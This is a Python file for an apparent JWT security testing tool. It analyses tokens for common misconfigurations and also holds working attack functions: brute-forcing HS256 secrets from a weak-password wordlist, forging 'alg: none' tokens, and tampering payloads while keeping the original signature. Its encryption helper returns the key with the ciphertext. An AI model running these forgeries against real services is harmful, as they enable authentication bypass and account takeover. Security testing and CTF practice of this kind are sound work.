import json
import base64
import hashlib
import hmac
import time
import jwt
from typing import Dict, List, Optional, Union
from dataclasses import dataclass
import secrets
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import struct

@dataclass
class JWTResult:
    """Container for JWT analysis results"""
    header: Dict
    payload: Dict
    signature_valid: bool
    algorithm: str
    vulnerabilities: List[str]
    recommendations: List[str]

class AuthScope:
    def __init__(self):
        self.common_secrets = [
            "secret", "password", "admin", "token", "jwt",
            "key", "supersecret", "masterkey", "123456",
            "qwerty", "letmein", "welcome"
        ]
    
    def decode_jwt(self, token: str) -> Optional[JWTResult]:
        """Decode JWT without verification"""
        try:
            # Split token
            parts = token.split('.')
            if len(parts) != 3:
                return None
            
            # Decode header and payload
            header = json.loads(base64.urlsafe_b64decode(parts[0] + '==').decode())
            payload = json.loads(base64.urlsafe_b64decode(parts[1] + '==').decode())
            
            return JWTResult(
                header=header,
                payload=payload,
                signature_valid=False,
                algorithm=header.get('alg', 'HS256'),
                vulnerabilities=[],
                recommendations=[]
            )
        except:
            return None
    
    def analyze_jwt(self, token: str) -> JWTResult:
        """Analyze JWT for common misconfigurations"""
        result = self.decode_jwt(token)
        if not result:
            raise ValueError("Invalid JWT format")
        
        # Check for common vulnerabilities
        vulns = []
        recs = []
        
        # 1. Check algorithm
        alg = result.header.get('alg', '').upper()
        if alg == 'NONE' or alg.endswith('NONE'):
            vulns.append('Algorithm set to "none" - allows signature bypass')
            recs.append('Reject tokens with "none" algorithm')
        
        # 2. Check for weak algorithms
        weak_algs = ['HS256', 'RS256']  # In real CTF, might find misconfigured alg switching
        if alg in weak_algs and 'kid' in result.header:
            vulns.append(f'Potential algorithm confusion with {alg}')
            recs.append('Verify algorithm consistency between services')
        
        # 3. Check expiration
        exp = result.payload.get('exp')
        if exp and exp < time.time():
            vulns.append('Token expired')
            recs.append('Refresh token or re-authenticate')
        
        # 4. Check not before
        nbf = result.payload.get('nbf')
        if nbf and nbf > time.time():
            vulns.append('Token not yet valid')
        
        # 5. Check for sensitive data in payload
        sensitive_keys = ['password', 'secret', 'key', 'credit', 'ssn', 'phone']
        for key in result.payload:
            if any(s in key.lower() for s in sensitive_keys):
                vulns.append(f'Sensitive data found in payload: {key}')
                recs.append('Remove sensitive data from JWT claims')
        
        # 6. Check for kid injection
        if 'kid' in result.header:
            vulns.append('KID header present - potential for path traversal/injection')
            recs.append('Sanitize KID values and use whitelisting')
        
        result.vulnerabilities = vulns
        result.recommendations = recs
        
        return result
    
    def test_secrets(self, token: str, wordlist: List[str] = None) -> Optional[str]:
        """Attempt to brute-force JWT secret"""
        if wordlist is None:
            wordlist = self.common_secrets
        
        result = self.decode_jwt(token)
        if not result:
            return None
        
        alg = result.header.get('alg', 'HS256')
        
        for secret in wordlist:
            try:
                # Try HS256
                jwt.decode(token, secret, algorithms=['HS256'])
                return secret
            except jwt.InvalidSignatureError:
                continue
            except:
                pass
        
        return None
    
    def generate_none_attack(self, original_token: str) -> str:
        """Generate a token with 'none' algorithm"""
        result = self.decode_jwt(original_token)
        if not result:
            return ""
        
        # Create new header with none algorithm
        new_header = result.header.copy()
        new_header['alg'] = 'none'
        
        # Encode
        header_b64 = base64.urlsafe_b64encode(
            json.dumps(new_header).encode()
        ).decode().rstrip('=')
        
        payload_b64 = base64.urlsafe_b64encode(
            json.dumps(result.payload).encode()
        ).decode().rstrip('=')
        
        return f"{header_b64}.{payload_b64}."
    
    def tamper_payload(self, token: str, modifications: Dict) -> str:
        """Create tampered token with modified payload"""
        result = self.decode_jwt(token)
        if not result:
            return ""
        
        # Apply modifications
        new_payload = result.payload.copy()
        new_payload.update(modifications)
        
        # Re-encode
        header_b64 = base64.urlsafe_b64encode(
            json.dumps(result.header).encode()
        ).decode().rstrip('=')
        
        payload_b64 = base64.urlsafe_b64encode(
            json.dumps(new_payload).encode()
        ).decode().rstrip('=')
        
        return f"{header_b64}.{payload_b64}.{token.split('.')[2]}"
    
    # Secure crypto implementation using AEAD (as per constraint)
    def encrypt_sensitive_data(self, data: str, key: bytes = None) -> Dict:
        """Encrypt sensitive data using AES-GCM (AEAD)"""
        if key is None:
            key = secrets.token_bytes(32)  # 256-bit key for AES-GCM
        
        aesgcm = AESGCM(key)
        nonce = secrets.token_bytes(12)  # 96-bit nonce
        
        ciphertext = aesgcm.encrypt(nonce, data.encode(), None)
        
        return {
            'ciphertext': base64.b64encode(ciphertext).decode(),
            'nonce': base64.b64encode(nonce).decode(),
            'key': base64.b64encode(key).decode()  # In real use, key should be stored separately
        }
    
    def decrypt_sensitive_data(self, encrypted_data: Dict) -> str:
        """Decrypt data encrypted with AES-GCM"""
        aesgcm = AESGCM(base64.b64decode(encrypted_data['key']))
        ciphertext = base64.b64decode(encrypted_data['ciphertext'])
        nonce = base64.b64decode(encrypted_data['nonce'])
        
        plaintext = aesgcm.decrypt(nonce, ciphertext, None)
        return plaintext.decode()